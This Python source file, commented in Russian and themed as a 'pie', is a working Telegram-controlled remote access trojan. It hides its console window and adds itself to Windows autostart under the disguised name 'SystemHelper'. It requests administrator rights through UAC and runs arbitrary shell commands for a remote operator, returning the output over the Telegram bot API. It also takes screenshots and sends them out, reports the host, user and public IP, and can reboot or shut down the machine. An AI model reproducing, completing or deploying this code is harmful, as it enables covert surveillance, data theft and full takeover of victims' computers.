#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Пирожок - вкусное блюдо для удаленного управления
Версия 3.0 - с правами администратора и уведомлениями
"""

import os
import sys
import subprocess
import threading
import time
import socket
import platform
import getpass
import requests
from datetime import datetime
import pyautogui
from PIL import Image
import io
import ctypes
import winreg
import tempfile
import uuid

# Конфигурация
BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
YOUR_TELEGRAM_ID = int(os.getenv('TELEGRAM_ID', '123456789'))

class Pirojok:
    """Главный класс нашего пирожка"""
    
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.owner_id = YOUR_TELEGRAM_ID
        self.last_update_id = 0
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
        self.running = True
        self.processes = []
        self.version = "3.0.0"
        self.command_timeout = 60
        self.admin_mode = self.check_admin()
        self.startup_time = datetime.now()
        
        # Создаём файл-маркер для отслеживания запусков
        self.marker_file = os.path.join(tempfile.gettempdir(), "pirojok_first_run.marker")
        
    def check_admin(self):
        """Проверка прав администратора"""
        try:
            if platform.system() == "Windows":
                return ctypes.windll.shell32.IsUserAnAdmin()
            else:
                # Для Linux/Mac проверяем EUID
                return os.geteuid() == 0
        except:
            return False
    
    def request_admin(self):
        """Запрос прав администратора (один раз при запуске)"""
        try:
            if self.check_admin():
                self.admin_mode = True
                return True
            
            if platform.system() != "Windows":
                return False
            
            # Определяем путь к исполняемому файлу
            if getattr(sys, 'frozen', False):
                executable = sys.executable
                params = ' '.join(sys.argv[1:])
            else:
                executable = sys.executable
                params = ' '.join([sys.argv[0]] + sys.argv[1:])
            
            # Создаём маркер, что мы уже запрашивали права
            with open(self.marker_file, 'w') as f:
                f.write(f"admin_requested:{datetime.now().isoformat()}")
            
            # Запрашиваем права через UAC
            result = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", executable, params, None, 1
            )
            
            if result > 32:
                # Завершаем текущий процесс, новый запустится с правами
                self.send_message(self.owner_id, "👑 Запрашиваю права администратора...")
                sys.exit(0)
            else:
                self.send_message(self.owner_id, "❌ Не удалось получить права администратора")
                return False
                
        except Exception as e:
            self.send_message(self.owner_id, f"❌ Ошибка запроса прав: {e}")
            return False
    
    def run_as_admin_command(self, command):
        """Выполнение команды с правами администратора"""
        try:
            if not self.admin_mode:
                return "❌ Нет прав администратора. Используйте команду 'admin' сначала"
            
            if platform.system() == "Windows":
                # Запускаем cmd с повышенными правами
                process = subprocess.Popen(
                    f'cmd /c {command}',
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True,
                    encoding='cp866',
                    errors='ignore'
                )
            else:
                # Для Linux/Mac используем sudo (если настроено)
                process = subprocess.Popen(
                    f'sudo {command}',
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True
                )
            
            self.processes.append(process)
            
            try:
                stdout, stderr = process.communicate(timeout=self.command_timeout)
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                return f"⚠️ Таймаут\n\nЧастичный вывод:\n{stdout}"
            
            result = ""
            if stdout:
                result += f"✅ Результат:\n{stdout}\n"
            if stderr:
                result += f"⚠️ Ошибки:\n{stderr}\n"
            
            return result or "✅ Команда выполнена"
            
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def send_message(self, chat_id, text):
        """Отправка сообщения"""
        try:
            url = f"{self.base_url}/sendMessage"
            data = {
                "chat_id": chat_id,
                "text": text,
                "parse_mode": "HTML"
            }
            requests.post(url, data=data, timeout=10)
        except Exception as e:
            print(f"Send error: {e}")
    
    def send_photo(self, chat_id, photo_bytes, caption=""):
        """Отправка фото"""
        try:
            url = f"{self.base_url}/sendPhoto"
            files = {"photo": ("screenshot.jpg", photo_bytes, "image/jpeg")}
            data = {"chat_id": chat_id, "caption": caption}
            requests.post(url, files=files, data=data, timeout=30)
        except:
            pass
    
    def get_system_info(self):
        """Сбор информации о системе"""
        info = []
        info.append(f"🥧 <b>ПИРОЖОК ИСПЕКСЯ!</b>")
        info.append(f"🍽 Версия: {self.version}")
        info.append(f"📅 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        info.append(f"💻 Хост: {socket.gethostname()}")
        info.append(f"👨‍🍳 Повар: {getpass.getuser()}")
        info.append(f"👑 Права: {'Администратор' if self.admin_mode else 'Пользователь'}")
        try:
            info.append(f"📍 IP: {requests.get('https://api.ipify.org', timeout=5).text}")
        except:
            info.append(f"📍 IP: неизвестен")
        info.append(f"⚙️ ОС: {platform.system()} {platform.release()}")
        info.append(f"🔧 Архитектура: {platform.machine()}")
        
        # Информация о времени работы
        uptime = datetime.now() - self.startup_time
        info.append(f"⏱ Работаю: {str(uptime).split('.')[0]}")
        
        return "\n".join(info)
    
    def take_screenshot(self):
        """Скриншот"""
        try:
            screenshot = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=85)
            img_bytes.seek(0)
            return img_bytes.read()
        except:
            return None
    
    def execute_command(self, command):
        """Обычная команда"""
        try:
            if platform.system() == "Windows":
                if command.lower().startswith("start "):
                    subprocess.Popen(command, shell=True)
                    return f"✅ Запущено: {command}"
                
                process = subprocess.Popen(
                    f'cmd /c {command}',
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True,
                    encoding='cp866',
                    errors='ignore'
                )
            else:
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True
                )
            
            self.processes.append(process)
            
            try:
                stdout, stderr = process.communicate(timeout=self.command_timeout)
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                return f"⚠️ Таймаут\n\nЧастичный вывод:\n{stdout}"
            
            result = ""
            if stdout:
                result += f"✅ Результат:\n{stdout}\n"
            if stderr:
                result += f"⚠️ Ошибки:\n{stderr}\n"
            
            return result or "✅ Команда выполнена"
            
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def add_to_startup(self):
        """Добавление в автозагрузку"""
        try:
            if platform.system() != "Windows":
                return "❌ Только для Windows"
            
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            
            # HKCU Run (не требует админа)
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "SystemHelper", 0, winreg.REG_SZ, f'"{exe_path}"')
            
            return "✅ Добавлено в автозагрузку"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def remove_from_startup(self):
        """Удаление из автозагрузки"""
        try:
            if platform.system() != "Windows":
                return "❌ Только для Windows"
            
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.DeleteValue(regkey, "SystemHelper")
            
            return "✅ Удалено из автозагрузки"
        except:
            return "❌ Не найдено в автозагрузке"
    
    def process_command(self, text, chat_id):
        """Обработка команд"""
        
        if chat_id != self.owner_id:
            self.send_message(chat_id, "⛔ Не для вас!")
            return
        
        # Проверка прав перед административными командами
        admin_commands = ["admin_cmd", "winlogon_add", "task_startup", "active_setup", "ifeo"]
        cmd_type = text.split()[0] if text else ""
        
        if cmd_type in admin_commands and not self.admin_mode:
            self.send_message(chat_id, "👑 Эта команда требует прав администратора. Сначала используйте 'admin'")
            return
        
        # Обычная cmd
        if text.startswith("cmd"):
            cmd = text[3:].strip()
            if cmd:
                self.send_message(chat_id, f"🔄 Выполняю: {cmd}")
                result = self.execute_command(cmd)
                
                if len(result) > 4000:
                    for i in range(0, len(result), 3500):
                        part = result[i:i+3500]
                        self.send_message(chat_id, f"📄 Часть {i//3500 + 1}:\n{part}")
                else:
                    self.send_message(chat_id, f"🥘 <b>Результат:</b>\n{result}")
            else:
                self.send_message(chat_id, "⚠️ Используйте: cmd <команда>")
        
        # Команда с правами админа
        elif text.startswith("admin_cmd"):
            cmd = text[9:].strip()
            if cmd:
                self.send_message(chat_id, f"👑 Выполняю с правами админа: {cmd}")
                result = self.run_as_admin_command(cmd)
                
                if len(result) > 4000:
                    for i in range(0, len(result), 3500):
                        part = result[i:i+3500]
                        self.send_message(chat_id, f"📄 Часть {i//3500 + 1}:\n{part}")
                else:
                    self.send_message(chat_id, f"👑 <b>Результат:</b>\n{result}")
            else:
                self.send_message(chat_id, "⚠️ Используйте: admin_cmd <команда>")
        
        # Запрос прав администратора
        elif text == "admin":
            if self.admin_mode:
                self.send_message(chat_id, "👑 Уже есть права администратора!")
            else:
                self.send_message(chat_id, "🔄 Запрашиваю права администратора...")
                self.request_admin()
        
        # Проверка прав
        elif text == "admin_check":
            if self.admin_mode:
                self.send_message(chat_id, "👑 Права администратора: ДА")
            else:
                self.send_message(chat_id, "👤 Права администратора: НЕТ")
        
        # website
        elif text.startswith("website"):
            url = text[7:].strip()
            if url:
                if not url.startswith(("http://", "https://")):
                    url = "https://" + url
                if platform.system() == "Windows":
                    os.system(f"start {url}")
                else:
                    os.system(f"xdg-open {url}")
                self.send_message(chat_id, f"✅ Открыт сайт: {url}")
            else:
                self.send_message(chat_id, "⚠️ Используйте: website <url>")
        
        # reboot
        elif text == "reboot":
            self.send_message(chat_id, "🔄 Перезагрузка через 5 секунд...")
            if platform.system() == "Windows":
                os.system("shutdown /r /t 5")
            else:
                os.system("sudo reboot")
        
        # shutdown
        elif text == "shutdown":
            self.send_message(chat_id, "💤 Выключение через 5 секунд...")
            if platform.system() == "Windows":
                os.system("shutdown /s /t 5")
            else:
                os.system("sudo shutdown -h now")
        
        # shot
        elif text == "shot":
            self.send_message(chat_id, "📸 Фоткаю...")
            screenshot = self.take_screenshot()
            if screenshot:
                self.send_photo(chat_id, screenshot, "🥧 Скриншот")
            else:
                self.send_message(chat_id, "❌ Не удалось сделать скриншот")
        
        # startup
        elif text == "startup_add":
            result = self.add_to_startup()
            self.send_message(chat_id, result)
        
        elif text == "startup_remove":
            result = self.remove_from_startup()
            self.send_message(chat_id, result)
        
        # winlogon (требует админа)
        elif text == "winlogon_add":
            # Здесь код добавления в Winlogon (из предыдущих ответов)
            self.send_message(chat_id, "🔧 Функция в разработке")
        
        # info
        elif text == "info":
            self.send_message(chat_id, self.get_system_info())
        
        # help
        elif text == "help" or text == "menu":
            help_text = """
🥧 <b>ПИРОЖОК v3.0 МЕНЮ:</b>

<b>ОСНОВНЫЕ:</b>
• cmd [команда] - обычная команда
• admin_cmd [команда] - команда от админа
• website [url] - открыть сайт
• shot - скриншот
• info - информация о системе
• reboot/shutdown - перезагрузка/выключение

<b>👑 АДМИНИСТРИРОВАНИЕ:</b>
• admin - запросить права админа (один раз)
• admin_check - проверить права
• winlogon_add - добавить в Winlogon (админ)

<b>🔄 АВТОЗАПУСК:</b>
• startup_add - добавить в автозагрузку
• startup_remove - удалить из автозагрузки
            """
            self.send_message(chat_id, help_text)
        
        else:
            self.send_message(chat_id, "❓ Нет такой команды. Используйте help")
    
    def on_system_startup(self):
        """Действия при запуске системы"""
        try:
            # Проверяем, первый ли это запуск после перезагрузки
            if os.path.exists(self.marker_file):
                # Это не первый запуск (после запроса прав)
                os.remove(self.marker_file)
                return
            
            # Отправляем уведомление о включении
            boot_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            message = f"🥧 <b>Пирожок испекся!</b>\n\n"
            message += f"📅 Время включения: {boot_time}\n"
            message += f"💻 Хост: {socket.gethostname()}\n"
            message += f"👤 Пользователь: {getpass.getuser()}\n"
            message += f"👑 Права: {'Администратор' if self.admin_mode else 'Пользователь'}\n"
            
            self.send_message(self.owner_id, message)
            
            # Отправляем скриншот рабочего стола
            time.sleep(5)  # Даем время на загрузку рабочего стола
            screenshot = self.take_screenshot()
            if screenshot:
                self.send_photo(self.owner_id, screenshot, "🥧 Рабочий стол после включения")
            
        except Exception as e:
            print(f"Startup error: {e}")
    
    def main_loop(self):
        """Основной цикл"""
        
        # Действия при запуске
        self.on_system_startup()
        
        # Отправляем информацию (если не отправили в on_system_startup)
        if not os.path.exists(self.marker_file):
            self.send_message(self.owner_id, self.get_system_info())
        
        while self.running:
            try:
                url = f"{self.base_url}/getUpdates"
                params = {
                    "offset": self.last_update_id + 1,
                    "timeout": 30,
                    "allowed_updates": ["message"]
                }
                response = requests.get(url, params=params, timeout=35)
                data = response.json()
                
                if data["ok"] and data["result"]:
                    for update in data["result"]:
                        self.last_update_id = update["update_id"]
                        if "message" in update and "text" in update["message"]:
                            thread = threading.Thread(
                                target=self.process_command,
                                args=(
                                    update["message"]["text"],
                                    update["message"]["chat"]["id"]
                                )
                            )
                            thread.daemon = True
                            thread.start()
                time.sleep(1)
            except Exception as e:
                print(f"Loop error: {e}")
                time.sleep(5)
    
    def run(self):
        """Запуск"""
        try:
            # Проверяем права при старте
            self.admin_mode = self.check_admin()
            
            # Запускаем основной цикл
            self.main_loop()
        except KeyboardInterrupt:
            self.running = False
            self.send_message(self.owner_id, "🥧 Пирожок убрали в холодильник")

if __name__ == "__main__":
    # Скрываем консоль на Windows
    if platform.system() == "Windows":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # Запускаем
    pirojok = Pirojok()
    pirojok.run()
